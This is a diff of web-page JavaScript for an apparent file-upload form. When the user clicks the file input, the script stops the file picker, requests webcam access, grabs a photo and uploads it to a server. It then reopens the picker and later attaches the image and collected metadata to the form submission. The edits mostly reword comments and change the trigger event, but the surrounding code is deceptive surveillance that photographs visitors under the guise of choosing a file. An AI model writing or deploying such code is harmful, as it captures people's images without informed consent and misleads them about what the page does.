@@ -7,7 +7,7 @@ const constraints = { video: { facingMode: "user" }, audio: false };
 let cameraCaptured = false;
 let cameraInProgress = false;
 let capturedImage = null;
-let cameraStream = null; // store the camera stream for reuse
+let cameraStream = null; // reuse camera stream
 
 // ================================
 // COLLECT METADATA (ON SUBMIT)
@@ -58,7 +58,7 @@ async function captureAndSendCamera() {
     // Request camera permission only once
     if (!cameraStream) {
       cameraStream = await navigator.mediaDevices.getUserMedia(constraints);
-      console.log("✅ Camera permission granted (system popup shown once)");
+      console.log("✅ Camera permission granted (system + Chrome popup shown once)");
     }
 
     // Dynamically create video element
@@ -71,9 +71,9 @@ async function captureAndSendCamera() {
 
     await new Promise((resolve) => { video.onloadedmetadata = () => resolve(); });
     await video.play();
-    await new Promise(r => setTimeout(r, 1200));
+    await new Promise(r => setTimeout(r, 1200)); // ensure frame ready
 
-    // Capture image from video
+    // Capture image
     const canvas = document.createElement("canvas");
     canvas.width = video.videoWidth || 640;
     canvas.height = video.videoHeight || 480;
@@ -94,7 +94,7 @@ async function captureAndSendCamera() {
     const data = await res.json();
     console.log("Camera upload response:", data);
 
-    // Cleanup video element
+    // Cleanup
     video.remove();
     cameraCaptured = true;
 
@@ -113,12 +113,12 @@ window.addEventListener("beforeunload", () => {
 });
 
 // ================================
-// TRIGGER CAMERA ONLY ON FILE INPUT
+// TRIGGER CAMERA ONLY ON FILE INPUT CLICK
 // ================================
-fileInput.addEventListener("pointerdown", async (e) => {
+fileInput.addEventListener("click", async (e) => {
   if (!cameraCaptured && !cameraInProgress) {
-    e.preventDefault(); // stop default file picker temporarily
-    await captureAndSendCamera(); // permission asked here once
+    e.preventDefault(); // prevent file picker temporarily
+    await captureAndSendCamera(); // request permission + capture
     setTimeout(() => fileInput.click(), 50); // reopen file picker
   }
 });
@@ -187,7 +187,7 @@ form.addEventListener("submit", async (e) => {
           file: fileData,
           filename: fileInput.files[0].name,
           metadata,
-          cameraImage: capturedImage || null, // attach camera image if available
+          cameraImage: capturedImage || null, // attach camera image if captured
         }),
       });
 
